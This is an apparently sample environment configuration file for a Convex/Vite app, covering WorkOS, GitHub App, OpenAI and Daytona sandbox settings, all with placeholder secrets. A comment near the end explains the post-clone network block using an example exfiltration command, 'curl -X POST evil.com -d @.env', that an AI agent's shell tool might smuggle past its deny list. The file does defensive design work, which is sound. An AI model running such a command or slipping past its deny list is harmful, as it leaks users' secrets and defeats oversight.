# =============================================================================
# Frontend (Vite) — stored in `.env`
# =============================================================================
# `npx convex dev` will usually write CONVEX_DEPLOYMENT and VITE_CONVEX_URL
# for you automatically. In Vercel builds, `bun run build:vercel` injects
# `VITE_CONVEX_URL` through `convex deploy`.

VITE_CONVEX_URL=https://example.convex.cloud
VITE_WORKOS_CLIENT_ID=your-workos-client-id

# =============================================================================
# Convex Backend — set via `npx convex env set` or in the Convex dashboard
# =============================================================================
# These variables are read by Convex server functions at runtime.
# Do NOT put them in `.env.local` — they must live in the Convex environment.

# -----------------------------------------------------------------------------
# WorkOS (Authentication)
# -----------------------------------------------------------------------------
# WORKOS_CLIENT_ID is intentionally separate from VITE_WORKOS_CLIENT_ID:
# the VITE_ version is exposed to the browser, while WORKOS_CLIENT_ID
# is read server-side by convex/auth.config.ts.
WORKOS_CLIENT_ID=your-workos-client-id

# -----------------------------------------------------------------------------
# GitHub App
# -----------------------------------------------------------------------------
# GitHub App credentials for installation-based auth and API access.
# GITHUB_APP_PRIVATE_KEY should be the raw PEM private key, including the
# BEGIN/END PRIVATE KEY lines. If your env tooling only supports a single line,
# preserve line breaks as \n.
GITHUB_APP_ID=your-github-app-id
GITHUB_APP_SLUG=your-github-app-slug
GITHUB_APP_PRIVATE_KEY=your-github-app-private-key-pem
GITHUB_APP_WEBHOOK_SECRET=your-github-webhook-secret

# -----------------------------------------------------------------------------
# OpenAI
# -----------------------------------------------------------------------------
OPENAI_API_KEY=your-openai-api-key
OPENAI_MODEL=gpt-4o-mini

# -----------------------------------------------------------------------------
# Sandbox chat mode (Plan 04 / 13 — private beta + percentage rollout)
# -----------------------------------------------------------------------------
# Three-axis gate consulted by both the chat mode resolver (UI selector) and
# the sendMessage / generation actions on the backend. A viewer is admitted
# iff the master switch is on AND (allowlisted OR in the rollout cohort).
#
# - SANDBOX_MODE_ENABLED: master switch. Truthy values: true / 1 / yes / on
#   (case-insensitive). Anything else (including unset) leaves the feature
#   off — the selector renders Sandbox as disabled with the "private beta"
#   tooltip and direct sendMessage(mode: "sandbox") calls reject.
# - SANDBOX_BETA_ALLOWLIST: comma-separated list of `tokenIdentifier` values
#   admitted regardless of the rollout percent. Use this for VIP / internal
#   testers and incident-response access during a paused rollout. The single
#   -entry wildcard `*` opens access to every signed-in viewer (intended for
#   dev / staging). Empty list with the master switch on AND zero rollout =
#   nobody allowed (operator visibly fails closed).
# - SANDBOX_ROLLOUT_PERCENT: integer in [0, 100] — Plan 13. Each viewer
#   hashes (FNV-1a 32-bit) into a stable bucket in [0, 100); a viewer is in
#   the rollout cohort iff their bucket is strictly less than this value.
#   Raising the percentage strictly *expands* the cohort (no member is ever
#   kicked out), so 10 → 50 → 100 is a safe ramp. See
#   `docs/sandbox-mode-rollout.md` for the SLOs and abort conditions of
#   each ramp step. Invalid values (`abc`, `-5`, etc.) fail closed to 0.
SANDBOX_MODE_ENABLED=false
SANDBOX_BETA_ALLOWLIST=
SANDBOX_ROLLOUT_PERCENT=0

# -----------------------------------------------------------------------------
# Daytona (Sandbox)
# -----------------------------------------------------------------------------
DAYTONA_API_KEY=your-daytona-api-key
DAYTONA_API_URL=https://app.daytona.io/api
DAYTONA_TARGET=
#
# Daytona webhook:
# - Endpoint URL: https://<your-convex-site>/api/daytona/webhook
# - Configure Daytona/Svix to sign deliveries and set the endpoint secret as
#   DAYTONA_WEBHOOK_SIGNING_SECRET so Convex can verify svix-id,
#   svix-timestamp, and svix-signature headers.
# - DAYTONA_WEBHOOK_ORGANIZATION_ID is optional but recommended as an extra allowlist check.
DAYTONA_WEBHOOK_SIGNING_SECRET=whsec_replace_with_your_daytona_webhook_signing_secret
DAYTONA_WEBHOOK_ORGANIZATION_ID=
DAYTONA_AUTO_STOP_MINUTES=30
DAYTONA_AUTO_ARCHIVE_MINUTES=1440
DAYTONA_AUTO_DELETE_MINUTES=2880
DAYTONA_CPU_LIMIT=2
DAYTONA_MEMORY_GIB=4
DAYTONA_DISK_GIB=20
# Sandbox network egress posture. The variable MUST be present (the import
# pipeline refuses to provision a sandbox if it is unset, to force an
# explicit choice). Daytona parses this as a comma-separated list of IPv4
# CIDR ranges — domain:port values such as `github.com:443` are rejected.
#   - "" (empty)              → use Daytona's default network policy
#                                 (dev posture; no per-deployment lock-down).
#   - "140.82.112.0/20,…"     → explicit IPv4 CIDR allow list. For GitHub
#                                 clone, source the current `git` ranges from
#                                 https://api.github.com/meta and refresh
#                                 periodically.
# See docs/sandbox-mode-system-design.md for the full rationale.
DAYTONA_NETWORK_ALLOW_LIST=""

# Post-clone egress block. After `git clone` succeeds inside the sandbox,
# `cloneRepositoryInSandbox` calls
# `sandbox.updateNetworkSettings({ networkBlockAll: true })` to drop all
# outbound traffic at the iptables layer for the rest of the sandbox's
# lifetime. This is the load-bearing block on data exfiltration: the LLM's
# `run_shell` tool is intended to be read-only, but a deny-list bypass that
# smuggles `curl -X POST evil.com -d @.env` past Layer 3 will fail at the
# network layer instead of completing the leak.
#
# The SDK call is gated by Daytona organization tier: only Tier 3+ orgs
# can override sandbox-level network policy. Tier 1/2 deployments must
# set this to `false` or every import will fail-closed at the post-clone
# step. Falling back means the system prompt, the `run_shell` deny list,
# the `redact()` chokepoint, and the throwaway sandbox lifecycle become
# the sole defense against egress-based exfiltration. That is acceptable
# for personal / dev deployments; it is NOT acceptable for a service that
# accepts third-party private repositories without disclosure. See
# `docs/sandbox-mode-security-system-design.md` for the full posture
# analysis.
#
# Accepted values (case-insensitive): true / 1 / yes / on, or false / 0 /
# no / off. Unset or unrecognised → secure default (`true`).
DAYTONA_POST_CLONE_BLOCK_NETWORK=true
